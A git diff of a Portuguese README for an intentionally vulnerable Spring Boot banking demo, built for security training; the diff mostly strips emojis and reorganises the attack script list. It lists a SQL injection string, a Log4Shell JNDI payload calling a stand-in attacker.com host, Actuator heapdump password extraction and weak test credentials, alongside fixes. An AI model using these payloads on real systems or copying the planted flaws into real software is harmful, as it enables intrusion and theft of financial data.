@@ -1,28 +1,28 @@
-# 🔴 Security Demo - Aplicação Bancária Vulnerável
+# Security Demo - Aplicação Bancária Vulnerável
 
-## ⚠️ IMPORTANTE: APENAS PARA FINS EDUCATIVOS ⚠️
+## IMPORTANTE: APENAS PARA FINS EDUCATIVOS
 
 Esta aplicação Spring Boot foi desenvolvida **INTENCIONALMENTE** com vulnerabilidades de segurança para demonstrar problemas comuns em aplicações web e como atacantes podem explorá-los.
 
-**🚫 NÃO USE EM PRODUÇÃO! 🚫**
+**NÃO USE EM PRODUÇÃO!**
 
-## 📋 Cenário da Demo
+## Cenário da Demo
 
 **Aplicação**: Microsserviço Java/Spring Boot de transações bancárias
 
 **Vulnerabilidades simuladas**:
-- ✅ **SQL Injection** - Queries concatenadas permitindo extração de dados
-- ✅ **PII em log** - CPF, senhas e dados financeiros expostos nos logs
-- ✅ **Endpoints sem proteção** - Configuração permitAll() inadequada
-- ✅ **Dependência vulnerável** - Log4j 2.14.1 (CVE-2021-44228)
+- **SQL Injection** - Queries concatenadas permitindo extração de dados
+- **PII em log** - CPF, senhas e dados financeiros expostos nos logs
+- **Endpoints sem proteção** - Configuração permitAll() inadequada
+- **Dependência vulnerável** - Log4j 2.14.1 (CVE-2021-44228)
 
 **Demonstração de ataques funcionando**:
-- 💥 SQL Injection retorna todos os saldos
-- 💥 Log mostra CPF em claro
-- 💥 Endpoints sensíveis acessíveis sem autenticação
-- 💥 Dependência vulnerável permite RCE
+- SQL Injection retorna todos os saldos
+- Log mostra CPF em claro
+- Endpoints sensíveis acessíveis sem autenticação
+- Dependência vulnerável permite RCE
 
-## 🚀 Como Executar
+## Como Executar
 
 ### Pré-requisitos
 - Java 11+
@@ -42,27 +42,9 @@ A aplicação estará disponível em: `http://localhost:8080`
 curl http://localhost:8080/api/usuarios/listar
 ```
 
-## 🎯 Demonstrações de Ataque
+## Demonstrações de Ataque
 
-### 🔴 Execução Rápida - Menu Interativo
-```bash
-./scripts/executar_todos.sh
-```
-
-### 🔍 Scripts Individuais por Vulnerabilidade
-
-#### 🎯 Script Principal (Menu Interativo)
-```bash
-./scripts/executar_todos.sh
-```
-**Funcionalidades:**
-- Opção 1: Executar todas as demonstrações sequencialmente
-- Opção 2: Executar demonstração específica
-- Opção 3: Análise completa (resumo executivo)
-- Verificação automática de conectividade
-- Interface amigável com instruções
-
-#### 🔍 Scripts Específicos por Vulnerabilidade
+### Scripts por Vulnerabilidade
 
 **1. SQL Injection** - `./scripts/1_sql_injection.sh`
 - Extração de todos os saldos bancários
@@ -85,16 +67,22 @@ curl http://localhost:8080/api/usuarios/listar
 **4. Dados Expostos** - `./scripts/4_dados_expostos.sh`
 - Listagem de usuários sem autenticação
 - Exposição de contas bancárias e saldos
-- Verificação de console H2 exposto
-- Enumeração de endpoints sensíveis
+- Busca de usuários por CPF
+- Consulta de saldos por faixa de valor
 
-**5. Dependência Vulnerável** - `./scripts/5_dependencia_vulneravel.sh`
+**5. Actuator - Informações Privadas** - `./scripts/5_actuator_info_privadas.sh`
+- Download de heapdump da aplicação
+- Análise de memória com VisualVM
+- Extração de senhas do banco de dados
+- Demonstração de vazamento via Actuator endpoints
+
+**6. Dependência Vulnerável (Log4Shell)** - `./scripts/6_log4shell.sh`
 - Verificação da versão Log4j vulnerável
 - Simulação de payloads Log4Shell
 - Análise do CVE-2021-44228
 - Demonstração de vetores de ataque
 
-### 🔍 Ataques Manuais
+### Ataques Manuais
 
 #### 1. SQL Injection - Extrair todos os saldos
 ```bash
@@ -116,7 +104,7 @@ curl -s "http://localhost:8080/api/usuarios/listar" | jq .
 ./scripts/3_endpoints_sem_protecao.sh
 ```
 
-### 📊 Dados de Teste Disponíveis
+### Dados de Teste Disponíveis
 
 | CPF | Nome | Senha | Conta | Saldo |
 |-----|------|-------|-------|--------|
@@ -124,9 +112,9 @@ curl -s "http://localhost:8080/api/usuarios/listar" | jq .
 | 98765432100 | Maria Santos | minhasenha | 98765-4 | R$ 25.000,75 |
 | 11122233344 | Carlos Admin | admin123 | 11111-1 | R$ 100.000,00 |
 
-## 🔍 Vulnerabilidades Detalhadas
+## Vulnerabilidades Detalhadas
 
-### 1. 💉 SQL Injection
+### 1. SQL Injection
 
 **Localização**:
 - `ContaBancariaRepository.java:21` - `findByNumeroContaVulneravel()`
@@ -152,7 +140,7 @@ SELECT * FROM contas_bancarias WHERE numero_conta = '' OR '1'='1'
 - `GET /api/transacoes/buscar-por-tipo/{tipo}`
 - `POST /api/auth/login`
 
-### 2. 📝 PII em Logs
+### 2. PII em Logs
 
 **Localização**:
 - `UsuarioService.java:19` - Log de dados completos do usuário
@@ -176,7 +164,7 @@ INFO - Transferência - CPF: 12345678901 de conta 12345-6 para conta 98765-4 no 
 DEBUG - Token JWT gerado: eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiVVNFUiI...
 ```
 
-### 3. 🔒 Endpoints sem Proteção
+### 3. Endpoints sem Proteção
 
 **Localização**:
 - `SecurityConfig.java:25` - Configuração permitAll() inadequada
@@ -193,7 +181,7 @@ curl -s "http://localhost:8080/api/usuarios/listar"
 # Retorna todos os dados dos usuários
 ```
 
-### 4. 📦 Dependência Vulnerável
+### 4. Dependência Vulnerável
 
 **Localização**: `pom.xml:30`
 
@@ -207,7 +195,7 @@ ${jndi:ldap://attacker.com/exploit}
 
 **Impacto**: Remote Code Execution (RCE)
 
-### 5. 🔒 Configuração de Segurança Inadequada
+### 5. Configuração de Segurança Inadequada
 
 **Localização**: `SecurityConfig.java:25`
 
@@ -218,29 +206,29 @@ ${jndi:ldap://attacker.com/exploit}
 - CSRF desabilitado
 - Frames permitidos
 
-## 🛡️ Como Corrigir as Vulnerabilidades
+## Como Corrigir as Vulnerabilidades
 
 ### 1. SQL Injection
 ```java
-// ❌ Vulnerável
+// Vulnerável
 @Query(value = "SELECT * FROM usuarios WHERE cpf = '" + ":cpf" + "'", nativeQuery = true)
 
-// ✅ Seguro
+// Seguro
 @Query("SELECT u FROM Usuario u WHERE u.cpf = :cpf")
 ```
 
 ### 2. PII em Logs
 ```java
-// ❌ Vulnerável
+// Vulnerável
 logger.info("Login - CPF: {}, Senha: {}", cpf, senha);
 
-// ✅ Seguro
+// Seguro
 logger.info("Login attempt for user with ID: {}", userId);
 ```
 
 ### 3. Configuração de Segurança Adequada
 ```java
-// ✅ Configuração segura
+// Configuração segura
 @Override
 protected void configure(HttpSecurity http) throws Exception {
     http.authorizeRequests()
@@ -254,7 +242,7 @@ protected void configure(HttpSecurity http) throws Exception {
 
 ### 4. Dependência Atualizada
 ```xml
-<!-- ✅ Versão segura -->
+<!-- Versão segura -->
 <dependency>
     <groupId>org.apache.logging.log4j</groupId>
     <artifactId>log4j-core</artifactId>
@@ -262,7 +250,7 @@ protected void configure(HttpSecurity http) throws Exception {
 </dependency>
 ```
 
-## 📁 Estrutura do Projeto
+## Estrutura do Projeto
 
 ```
 security-demo/
@@ -290,16 +278,16 @@ security-demo/
 │       ├── TransacaoService.java
 │       └── UsuarioService.java
 ├── scripts/
-│   ├── executar_todos.sh (🎯 Menu principal)
 │   ├── 1_sql_injection.sh
 │   ├── 2_pii_logs.sh
 │   ├── 3_endpoints_sem_protecao.sh
 │   ├── 4_dados_expostos.sh
-│   └── 5_dependencia_vulneravel.sh
+│   ├── 5_actuator_info_privadas.sh
+│   └── 6_log4shell.sh
 └── README.md
 ```
 
-## 🎓 Cenários de Uso Educativo
+## Cenários de Uso Educativo
 
 ### Para Desenvolvedores
 - Entender como vulnerabilidades são introduzidas
@@ -316,9 +304,9 @@ security-demo/
 - Mostrar como vulnerabilidades passam pelo pipeline
 - Justificar implementação de gates de segurança
 
-## 🚨 Avisos Legais
+## Avisos Legais
 
-**⚠️ IMPORTANTE ⚠️**
+**IMPORTANTE**
 
 - Esta aplicação é **INTENCIONALMENTE VULNERÁVEL**
 - Use **APENAS** para fins educativos e de treinamento
@@ -326,7 +314,7 @@ security-demo/
 - **NÃO USE** este código como base para aplicações reais
 - Os autores **NÃO SE RESPONSABILIZAM** por uso inadequado
 
-## 📚 Recursos Adicionais
+## Recursos Adicionais
 
 - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
 - [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
@@ -335,4 +323,4 @@ security-demo/
 
 ---
 
-**Desenvolvido para demonstrar vulnerabilidades de segurança em aplicações web. Use com responsabilidade! 🛡️**
+**Desenvolvido para demonstrar vulnerabilidades de segurança em aplicações web. Use com responsabilidade!**
